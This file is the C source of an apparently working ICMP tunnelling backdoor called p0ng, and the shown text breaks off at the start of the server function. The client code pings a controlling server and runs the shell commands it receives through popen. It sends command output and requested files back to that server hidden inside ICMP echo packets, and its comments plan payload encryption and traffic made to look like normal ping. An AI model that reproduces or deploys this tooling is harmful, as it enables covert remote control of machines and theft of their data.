/**
 * Copyright (c) 2020-2021 aplyc1a <aplyc1a@protonmail.com>
 * 
 * How to start:
 * step 1: gcc p0ng.c -lpthread -o p0ng
 * step 2: echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all  #client part dont need.
 * step 3: ./p0ng -S
 * step 4: ./p0ng -C -s ${server_addr}
 * step 5: Input 'help' in server part.Enjoy.
 *
 * @todo 大的待做需求列表:
 * 1.支持对客户端上线管理。
 * 2.支持ICMP payload加解密。
 * 3.支持可交互式的设置时间参数。包括，被控端请求周期与数据传输的周期。
 * 4.支持可交互式的设置p0ng协议数据大小。
 * 5.支持动态的开启一个数据转发代理端口。（暂不考虑）
 *
 **/

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <time.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>

#define PACKET_SIZE             4096
#define IPHDR_DEFAULT_LEN       20
#define ICMPHDR_LEN             8
#define ICMP_TIMESTAMP_LEN      8
#define ICMP_DATA_PRESERVE      8
#define ICMP_DATA_DEFAULT_LEN   48
#define ICMP_DATA_LEN           48
#define CONNECTTION_TIMEOUT     3

#define ICMP_REGULAR            0
#define ICMP_TASK_QUERY         1
#define ICMP_NO_TASK            1
#define ICMP_SHELLCMD           2
#define ICMP_SHELLCMD_RESULT    3
#define ICMP_UPLOAD             4
#define ICMP_UPLOAD_RESULT      5
#define ICMP_DOWNLOAD           6
#define ICMP_DOWNLOAD_QUERY     7

#define P0NG_CONNECTTION_TIMEOUT 11
#define P0NG_HDR_ERROR           12
#define P0NG_INTERNAL_ERROR      13
#define P0NG_SUCCESS             0

#define MAX_RETRY_TIMES          3
#define USLEEP_TIME             400

uint8_t current_work[ICMP_DATA_LEN-ICMP_DATA_PRESERVE];/*for any p0ng entity*/
uint8_t msg2request[ICMP_DATA_LEN-ICMP_DATA_PRESERVE];/*for p0ng client*/
uint8_t msg_received[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];/*for p0ng client*/
uint8_t debug=1,verbose=1;
struct sockaddr_in dest_addr;
uint8_t sockfd;
uint16_t pid; 
struct timeval timeval_new={5,0};
    
unsigned short cal_chksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;
    /*把ICMP报头二进制数据以2字节为单位累加起来*/
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    /*若ICMP报头为奇数个字节，会剩下最后一字节。把最后一个字节视为一个2字节数据的高字节，这个2字节数据的低字节为0，继续累加*/
    if (nleft == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *) w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

void print_usage(){
    printf("[shell    *] : execute linux shell command on the remote device.\n");
    printf("[upload   *] : upload file to the p0ng-server.\n");
    printf("[download *] : download file from the p0ng-server.\n");
    printf("[reset     ] : manual reset current work immediately.\n");
    //@todo
    //printf("[sessions     ] : show current alive hosts\n");
    printf("[help      ] : show these help message.\n");
}

void print_logo(){
    printf("       _                                     \n");
    printf(" _ __ (_)_ __   __ _ _ __   ___  _ __   __ _ \n");
    printf("| '_ \\| | '_ \\ / _` | '_ \\ / _ \\| '_ \\ / _` |\n");
    printf("| |_) | | | | | (_| | |_) | (_) | | | | (_| |\n");
    printf("| .__/|_|_| |_|\\__, | .__/ \\___/|_| |_|\\__, |\n");
    printf("|_|            |___/|_|                |___/ \n");
    printf("                                   @aplyc1a  \n");
}

void set_current_work(uint8_t work_type,uint8_t *data, uint8_t data_length) {
    (void)snprintf(current_work, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",work_type, 0, 0, data_length, data);
}

void reset_current_work(){
	memset(current_work,0,sizeof(current_work));
    (void)snprintf(current_work, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_NO_TASK, 0, 0, 0, "");
}

uint8_t p0ng_pack(uint8_t *sendpacket, uint8_t pack_no, uint8_t icmp_type, uint8_t *buf, uint8_t len) {
    uint8_t pack_size;
    struct icmp *icmp;
    struct timeval *tval;
    icmp = (struct icmp*) sendpacket;
    icmp->icmp_type = icmp_type;
    icmp->icmp_code = 0;
    icmp->icmp_cksum = 0;
    icmp->icmp_seq = pack_no;
    icmp->icmp_id = pid;
    pack_size = ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN;
    tval = (struct timeval *) icmp->icmp_data;
    gettimeofday(tval, NULL);
    memcpy(sendpacket+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN , buf, len);
    icmp->icmp_cksum = cal_chksum((uint16_t *) icmp, pack_size);
    return pack_size;
}

uint8_t p0ng_pkt_basicchk(uint8_t *buff, uint8_t buff_len, uint8_t *sendpacket, uint8_t sendpacket_size) {
    uint8_t iphdrlen;
    struct ip *st_ip;
    struct icmp *st_icmp;
    st_ip = (struct ip *) buff;
    iphdrlen = st_ip->ip_hl << 2; 
    st_icmp = (struct icmp *) (buff + iphdrlen); 
    buff_len -= iphdrlen;
    if (buff_len < 8) {
        printf("\033[40;33m[!]\033[0mICMP packet length too short!\n");
        return 1;
    }
    

    if(buff_len != (ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN)){
        printf("recv-length: %d!\nIn Theroy: %d!\n",buff_len,(ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN));
    }
    if (st_icmp->icmp_type == ICMP_ECHOREPLY) {
        
        //@todo checksum here
        if (st_icmp->icmp_id != pid){
            if(verbose||debug) printf("\r\033[Kst_icmp->icmp_id:%u -- pid:(%u)\n",st_icmp->icmp_id,pid);
            return 1;
        }
            
        if (memcmp(buff+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, sendpacket+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, ICMP_DATA_PRESERVE)!=0) {
            if(verbose||debug) printf("\r\033[KCheck ICMP_DATA_PRESERVE failure!\n");
            return 1;
        }    
    }
    
    if (st_icmp->icmp_type == ICMP_ECHO) {
        if(verbose||debug) printf("\r\033[KRecved ICMP ECHO!\n");
        // 理论上只有这几种类型的报文 ICMP_TASK_QUERY ICMP_SHELLCMD_RESULT ICMP_UPLOAD_RESULT ICMP_DOWNLOAD_QUERY
        return 0;
    }
    return 0;
}

uint8_t p0ng_get_current_work(uint8_t *buff, uint8_t buff_len, uint8_t *work2do, uint8_t work2do_len){
    uint8_t iphdrlen;
    struct ip *st_ip;
    st_ip = (struct ip *) buff;
    iphdrlen = st_ip->ip_hl << 2;
    uint8_t *p0ng_coremsg=buff+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE;
    
    //@todo check data-domain 4 keys value
    if(p0ng_coremsg[0]==ICMP_REGULAR){
        return P0NG_INTERNAL_ERROR;
    }
    
    memcpy(current_work, p0ng_coremsg, ICMP_DATA_LEN - ICMP_DATA_PRESERVE);
    return P0NG_SUCCESS;
    
}

void check_server(uint8_t seq_num){
    uint8_t sendpacket[PACKET_SIZE];
    uint8_t recvpacket[PACKET_SIZE];
    uint8_t sendpacket_size;
    int8_t recv_pkt_size;
    uint8_t icmpdata[48]={0};
    uint8_t icmp_data_prefix[8]={0};
    uint8_t icmp_data_len=0;
    uint8_t count=0;
    int32_t length=0;
    struct timeval timeval_old;
    
    while(count<3){//一般来说data域前三字节不为空
        icmp_data_prefix[count]=rand()%255;
        count++;
    }
    memcpy(icmpdata,icmp_data_prefix,8);

    (void)snprintf(msg2request, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_REGULAR, 0, 0, 0, "");//实际上就是正常的ping请求    
    memcpy(icmpdata+8,msg2request,sizeof(msg2request));
    icmp_data_len=ICMP_DATA_PRESERVE+sizeof(msg2request);
    
    sendpacket_size = p0ng_pack(sendpacket,seq_num,ICMP_ECHO,icmpdata,icmp_data_len);//@todo 后期考虑怎么加密payload
    if(sendto(sockfd, sendpacket, sendpacket_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
        printf("\033[40;31m[-]\033[0mcheck server send error!\n");
        exit(1);
    }
    //signal(SIGALRM, handler);
    //alarm( 5 ); 
    getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
    recv_pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);//默认等3秒
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
    if (recv_pkt_size==-1) {
        printf("Connect timeout!\n");
        exit(1);
    }
    
    if (p0ng_pkt_basicchk(recvpacket, recv_pkt_size, sendpacket, sendpacket_size)) {/*正常为0*/
        exit(1);
    }

}

//@todo支持对客户端回复相同data域的报文，使报文更像正常的ICMP通信。
void show_execute_result(uint8_t *recvd_packet,uint8_t recvd_len){
    uint8_t recvpacket[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];
    uint8_t not_finish=1;
    uint8_t pkt_size;
    uint8_t iphdrlen;
    struct ip *ip;
    struct timeval timeval_old;
    struct timeval timeval_new={30,0};
    int32_t length=0;
    
    memcpy(recvpacket,recvd_packet,recvd_len);    
    ip = (struct ip *) recvpacket;
    iphdrlen = ip->ip_hl << 2;

    not_finish = recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+1];
    
    if(not_finish){
        printf("\r\033[K%s",recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4);
    }
    while(not_finish){
        getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
        pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);//@todo 后期考虑能动态设置，当前设置30s超时
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));

        printf("%s",recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4);
        not_finish = recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+1];
    }

}

//@todo支持对客户端回复相同data域的报文，使报文更像正常的ICMP通信。
void show_upload_result(uint8_t *recvd_packet,uint8_t recvd_len){
    uint8_t recvpacket[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];
    uint8_t not_finish=1;
    uint8_t pkt_size;
    uint8_t iphdrlen;
    struct ip *ip;
    struct timeval timeval_old;
    struct timeval timeval_new={30,0};
    int32_t length=0;
    uint8_t filename[50];
    
    time_t t;
    time(&t);
    struct tm *tmp_time=localtime(&t);
    strftime(filename,sizeof(filename),"%04Y%02m%02d%H%M%S.p0ng",tmp_time);
    
    FILE *fp = fopen(filename, "wb");
    if(fp == NULL)
    {
        printf("\033[40;31m[-]\033[0mfopen error!\n");
        return ;
    }  
	
    memcpy(recvpacket,recvd_packet,recvd_len);    
    ip = (struct ip *) recvpacket;
    iphdrlen = ip->ip_hl << 2;

    not_finish = recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+1];
    fwrite(recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4, recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+3],1, fp);

    while(not_finish){
        getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
        pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);//@todo 后期考虑能动态设置，当前设置30s超时
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
		
        not_finish = recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+1];
        fwrite(recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+4, recvpacket[iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE+3],1, fp);
		if (!not_finish) break;
    }

    printf("\033[40;36m[*]\033[0mUpload completed. Local filename: \033[40;36m%s\033[0m\n", filename);
    fclose(fp);
}

//@todo client支持download功能
void show_download_result(uint8_t *recvd_packet,uint8_t recvd_len){
	printf("stub show_download_result\n");

}

void regular_responcer(uint8_t *recvpkt, uint8_t recvpkt_len){
    uint8_t sendpkt[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
    struct icmp *recv_icmp, *send_icmp;
    unsigned long inaddr = 0l;
    struct ip *recv_ip;
    uint8_t iphdrlen;    
    recv_ip = (struct ip *) recvpkt;
    iphdrlen = (recv_ip->ip_hl)<<2;
    recv_icmp = (struct icmp *) (recvpkt + iphdrlen);
//拼包开始
    //ICMP头拼包
    send_icmp = (struct icmp*)sendpkt;
    memcpy(sendpkt,recvpkt+20,ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN);
    send_icmp->icmp_type = ICMP_ECHOREPLY;
    send_icmp->icmp_code = recv_icmp->icmp_code;
    send_icmp->icmp_cksum = 0;
    send_icmp->icmp_seq = recv_icmp->icmp_seq;
    send_icmp->icmp_id = recv_icmp->icmp_id;
    //ICMP头校验
    send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN); /*校验算法*/
    //修改回包IP
    inaddr = inet_addr(inet_ntoa(recv_ip->ip_src));
    memcpy((char *) &dest_addr.sin_addr, (char*)&inaddr,sizeof(inaddr));

    sendto(sockfd, sendpkt, ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
}

void current_task_responcer(uint8_t *recvpacket, uint8_t pkt_size){
    uint8_t pkt2send[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
    struct icmp *recv_icmp, *send_icmp;
    struct ip *recv_ip;
    uint8_t iphdrlen;
    uint8_t pack_size;    
    uint8_t ret = 0;
    if(p0ng_pkt_basicchk(recvpacket, pkt_size, NULL, 0)) 
        return;
    recv_ip = (struct ip *) recvpacket;
    iphdrlen = (recv_ip->ip_hl)<<2;
    recv_icmp = (struct icmp *) (recvpacket + iphdrlen);
    //需要发送的ICMP-p0ng包，包头在这里预拼接
    send_icmp = (struct icmp*)pkt2send;
    send_icmp->icmp_type = ICMP_ECHOREPLY;
    send_icmp->icmp_code = recv_icmp->icmp_code;
    send_icmp->icmp_cksum = 0;
    send_icmp->icmp_seq = recv_icmp->icmp_seq;
    send_icmp->icmp_id = recv_icmp->icmp_id;
    pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
    //下面开始拼接ICMP-p0ng的DATA域
        
    //拷贝 ICMP时间戳 数据区的8位保留数据
    memcpy(pkt2send+ICMPHDR_LEN, recvpacket+iphdrlen+ICMPHDR_LEN, ICMP_TIMESTAMP_LEN);
    memcpy(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, recvpacket+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN,
             ICMP_DATA_PRESERVE);
    memcpy(send_icmp->icmp_data,recv_icmp->icmp_data,ICMP_DATA_PRESERVE);
    //拷贝 文件数据到p0ng的核心数据区，前面4字节是状态控制字。
    (void)memcpy(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE, current_work, 
            sizeof(current_work));
    //ICMP头校验
    send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size); /*校验算法*/
    //发送回包
    sendto(sockfd, pkt2send, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
            0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
    
}

uint8_t currentwork_requester(uint8_t seq_num){
    uint8_t recvpacket[PACKET_SIZE]={0};
    uint8_t sendpacket_size;
    int8_t recv_pkt_size;
    uint8_t icmpdata[48]={0};
    uint8_t icmp_data_prefix[8]={0};
    uint8_t icmp_data_len=0;
    uint8_t count=0;
    int32_t length=0;
    struct timeval timeval_old;
    
    while(count<3){//一般来说data域前三字节不为空
        icmp_data_prefix[count]=rand()%255;
        count++;
    }
    memcpy(icmpdata,icmp_data_prefix,8);

    memset(msg2request,0,ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
    (void)snprintf(msg2request, ICMP_DATA_LEN-ICMP_DATA_PRESERVE, "%c%c%c%c%s",ICMP_TASK_QUERY, 0, 0, 0, "");  
    memcpy(icmpdata+8,msg2request,sizeof(msg2request));
    icmp_data_len = ICMP_DATA_PRESERVE+sizeof(msg2request);
    
    sendpacket_size = p0ng_pack(msg2request,seq_num,ICMP_ECHO,icmpdata,icmp_data_len);//@todo 后期考虑怎么加密payload
    if(sendto(sockfd, msg2request, sendpacket_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
        return 1;
    }

    getsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, &length);
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_new, sizeof(struct timeval));
    recv_pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);//默认等3秒
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
    if (recv_pkt_size==-1) {
        if (verbose||debug) printf("Connect timeout!\n");
        return P0NG_CONNECTTION_TIMEOUT;
    }
    if(p0ng_pkt_basicchk(recvpacket, recv_pkt_size, msg2request, sendpacket_size)){/*正常为0*/
        printf("[-]Something wrong in responce.\n");
        return P0NG_HDR_ERROR;
    }
    
    if (p0ng_get_current_work(recvpacket, recv_pkt_size, current_work, sizeof(current_work))) {/*正常为0*/
        printf("[-]p0ng try to get current work from responce failed!\n");
        return P0NG_INTERNAL_ERROR;
    }
    memset(msg_received,0,sizeof(msg_received));
    memcpy(msg_received,recvpacket,sizeof(msg_received));
    return P0NG_SUCCESS;
}

void do_execute_task(){
    uint8_t pkt2send[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
    uint8_t iphdrlen;
    uint8_t pack_size;
    struct ip *recv_ip, *send_ip;
    struct icmp *recv_icmp, *send_icmp;
    struct timeval *tval;
    FILE *fp = NULL;
    uint8_t data2send[ICMP_DATA_LEN-ICMP_DATA_PRESERVE-4]={0};//4 为data域内的几个状态位

    uint8_t seq_id=0,not_ok=1;
    //使用msg_received解析出IP头
    recv_ip = (struct ip *) msg_received;
    iphdrlen = (recv_ip->ip_hl)*4; /*ip报头的长度标志乘4求得ip报头长度*/
    recv_icmp = (struct icmp *) (msg_received + iphdrlen); 
    //需要发送的ICMP-p0ng包，包头在这里预拼接
    send_icmp = (struct icmp*)pkt2send;
    send_icmp->icmp_type = ICMP_ECHO;
    send_icmp->icmp_code = recv_icmp->icmp_code;
    send_icmp->icmp_cksum = 0;
    send_icmp->icmp_seq = recv_icmp->icmp_seq;
    send_icmp->icmp_id = recv_icmp->icmp_id;
    pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
    if(verbose||debug) printf("cmd:%s\n",msg_received+iphdrlen+28);
    
	//命令执行
    fp = popen(msg_received+iphdrlen+28,"r");//28=24+4个校验位
    if(fp==NULL){
        printf("\033[40;31m[-]\033[0m popen error!\n");
    }

    while(fgets(data2send,sizeof(data2send),fp)!=NULL){
        seq_id++;
        //下面开始拼接ICMP-p0ng的DATA域
        //拷贝 ICMP时间戳 数据区的8位保留数据
        memcpy(pkt2send+ICMPHDR_LEN, msg_received+iphdrlen+ICMPHDR_LEN, ICMP_TIMESTAMP_LEN);
        memcpy(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, msg_received+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, ICMP_DATA_PRESERVE);
        memcpy(send_icmp->icmp_data,recv_icmp->icmp_data,ICMP_DATA_PRESERVE);
        //拷贝 文件数据到p0ng的核心数据区，前面4字节是状态控制字。
        (void)snprintf(pkt2send + ICMPHDR_LEN + ICMP_TIMESTAMP_LEN +  ICMP_DATA_PRESERVE,
               ICMP_DATA_LEN-8, "%c%c%c%c%s", ICMP_SHELLCMD_RESULT, not_ok, seq_id, (uint8_t)strlen(data2send), data2send);
        //ICMP头校验
        send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size);
        //发送回包
        sendto(sockfd, pkt2send, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
               0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
    }
   //构造尾包用来通知服务器端数据传输结束。
    not_ok=0;
    memset(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE,0,ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
    memcpy(pkt2send+ICMPHDR_LEN, msg_received+iphdrlen+ICMPHDR_LEN, ICMP_TIMESTAMP_LEN);
    memcpy(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, msg_received+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, ICMP_DATA_PRESERVE);
    memcpy(send_icmp->icmp_data, recv_icmp->icmp_data, ICMP_DATA_PRESERVE);
    (void)snprintf(pkt2send+ICMP_TIMESTAMP_LEN+ICMPHDR_LEN+ICMP_DATA_PRESERVE, ICMP_DATA_LEN-8,
                    "%c%c%c%c%s", ICMP_SHELLCMD_RESULT, not_ok, ++seq_id, (uint8_t)strlen(""), "");
    send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size);
    sendto(sockfd, pkt2send, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
           0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));

}

void do_upload_task(){
    uint8_t pkt2send[ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN]={0}; //该payload不含IPHDR
    uint8_t data2send[ICMP_DATA_LEN-ICMP_DATA_PRESERVE-4]={0};//4 为data域内的几个状态位
	uint8_t filename[50]={0};
    uint8_t iphdrlen;
    uint8_t pack_size;
    struct ip *recv_ip, *send_ip;
    struct icmp *recv_icmp, *send_icmp;
    struct timeval *tval;
    uint8_t ret=0;
    uint8_t seq_id=0,not_ok=1;
	
    //使用msg_received解析出IP头
    recv_ip = (struct ip *) msg_received;
    iphdrlen = (recv_ip->ip_hl)*4; /*ip报头的长度标志乘4求得ip报头长度*/
    recv_icmp = (struct icmp *) (msg_received + iphdrlen); 
    //需要发送的ICMP-p0ng包，包头在这里预拼接
    send_icmp = (struct icmp*)pkt2send;
    send_icmp->icmp_type = ICMP_ECHO;
    send_icmp->icmp_code = recv_icmp->icmp_code;
    send_icmp->icmp_cksum = 0;
    send_icmp->icmp_seq = recv_icmp->icmp_seq;
    send_icmp->icmp_id = recv_icmp->icmp_id;
    pack_size = ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN;
    
    strncpy(filename, msg_received+iphdrlen+28, sizeof(msg_received));
	filename[strlen(filename)-1]='\0';
	if(verbose||debug) printf("file 2 upload:%s\n",filename);
    FILE *fp = fopen(filename, "r");//28=24+4个校验位
    if(fp==NULL){
        printf("\033[40;31m[-]\033[0m fopen error!\n");
		return ;
    }

    while(!feof(fp)){
		memset(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE,0,ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
		memset(data2send,0,sizeof(data2send)-1);
        usleep(USLEEP_TIME);
        seq_id++;        
        ret=fread(data2send, 1, sizeof(data2send)-1, fp);
		
        //下面开始拼接ICMP-p0ng的DATA域
        //拷贝 ICMP时间戳 数据区的8位保留数据
        memcpy(pkt2send+ICMPHDR_LEN, msg_received+iphdrlen+ICMPHDR_LEN, ICMP_TIMESTAMP_LEN);
        memcpy(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, msg_received+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, ICMP_DATA_PRESERVE);
        memcpy(send_icmp->icmp_data,recv_icmp->icmp_data,ICMP_DATA_PRESERVE);
        //拷贝 文件数据到p0ng的核心数据区，前面4字节是状态控制字。
        (void)snprintf(pkt2send + ICMPHDR_LEN + ICMP_TIMESTAMP_LEN +  ICMP_DATA_PRESERVE,
               ICMP_DATA_LEN-8, "%c%c%c%c", ICMP_UPLOAD_RESULT, not_ok, seq_id, ret );
	    memcpy(pkt2send+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN + ICMP_DATA_PRESERVE+4, data2send, sizeof(data2send)-1);
        //ICMP头校验
        send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size);
        //发送回包
        sendto(sockfd, pkt2send, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
               0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
		
    }
   //构造尾包用来通知服务器端数据传输结束。
    not_ok=0;
    memset(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE,0,ICMP_DATA_LEN-ICMP_DATA_PRESERVE);
    memcpy(pkt2send+ICMPHDR_LEN, msg_received+iphdrlen+ICMPHDR_LEN, ICMP_TIMESTAMP_LEN);
    memcpy(pkt2send+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, msg_received+iphdrlen+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN, ICMP_DATA_PRESERVE);
    memcpy(send_icmp->icmp_data, recv_icmp->icmp_data, ICMP_DATA_PRESERVE);
    (void)snprintf(pkt2send+ICMP_TIMESTAMP_LEN+ICMPHDR_LEN+ICMP_DATA_PRESERVE, ICMP_DATA_LEN-8,
                    "%c%c%c%c%s", ICMP_UPLOAD_RESULT, not_ok, ++seq_id, (uint8_t)strlen(""), "");
    send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size);
    sendto(sockfd, pkt2send, ICMP_DATA_LEN + ICMP_TIMESTAMP_LEN + ICMPHDR_LEN, 
           0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));
}

void do_download_task(){
    printf("stub for do_download_task!\n");
}

void client_dispatch_work(){
    //目前来说current_work只用来在每次变更命令类型时存储p0ng包信息。数据传输不用它，后期考虑在日志信息中引用这段空间。
    switch(current_work[0]){
        case ICMP_SHELLCMD:
            do_execute_task();
            break;
        case ICMP_UPLOAD:
            do_upload_task();
            break;
        case ICMP_DOWNLOAD:
            /*download比较特殊，先给服务器回报通知可以发数据了，再接受服务器数据，最周返给服务器文件名称*/
			do_download_task();
            break;
        case ICMP_REGULAR:
            break;
        case ICMP_NO_TASK: //ICMP_TASK_QUERY
            break;
        case ICMP_SHELLCMD_RESULT:            
        case ICMP_UPLOAD_RESULT:
        case ICMP_DOWNLOAD_QUERY:
        default:
            if(verbose||debug) printf("[-]recv malformed packet! p0ngtype (%x)\n",current_work[0]);
    }
    
}

void p0ng_client(char *server_ip){
    struct hostent *host;
    struct protoent *protocol;
    unsigned long inaddr = 0l;
    uint32_t size = 50 * 1024;
    uint16_t count = 1;
    uint8_t ret=0;
    uint8_t times=0;
    if ((protocol = getprotobyname("icmp")) == NULL)
    {
        perror("getprotobyname error");
        exit(1);
    }

    if ((sockfd = socket(AF_INET, SOCK_RAW, protocol->p_proto)) < 0)
    {
        perror("socket error");
        exit(1);
    }
    setuid(getuid());
    setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &size, sizeof(size));
    bzero(&dest_addr, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    /*判断是主机名还是ip地址*/
    if ((inaddr = inet_addr(server_ip)) == INADDR_NONE)
    {
        if ((host = gethostbyname(server_ip)) == NULL) {
            perror("gethostbyname error");
            exit(1);
        }
        /*是主机名*/
        memcpy((char *) &dest_addr.sin_addr, host->h_addr, host->h_length);
    } else {
        /*是IP地址*/
        memcpy((char *) &dest_addr.sin_addr, (char*)&inaddr,sizeof(inaddr));
    }
    /*设置ICMP的标志符*/
    pid = getpid();
    check_server(count);
    printf("\r\033[KConnection success!\n");

    while(1){
        reset_current_work();
        ret = currentwork_requester(count);
        if (ret == P0NG_CONNECTTION_TIMEOUT) {
            check_server(count);
        }
        if(ret == P0NG_INTERNAL_ERROR || ret == P0NG_HDR_ERROR){
            times++;
            if(times==MAX_RETRY_TIMES)
                printf("p0ng PROTOCOL INTERNAL ERROR!\n");
                exit(1);
            continue;
        }
        count++;

        client_dispatch_work();
        sleep(10);
    }
}

void *p0ng_server(){
